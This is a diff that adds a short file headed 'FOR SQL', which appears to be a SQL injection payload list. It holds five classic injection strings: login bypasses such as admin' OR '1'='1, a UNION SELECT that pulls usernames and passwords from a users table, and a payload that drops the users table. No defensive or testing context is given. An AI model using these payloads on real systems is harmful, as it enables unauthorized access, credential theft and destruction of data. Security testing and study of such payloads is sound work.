@@ -1,0 +1,11 @@
+FOR SQL
+
+OR 1=1--
+
+admin'--
+
+' UNION SELECT NULL, username, password FROM users--
+
+admin' OR '1'='1
+
+'; DROP TABLE users;--
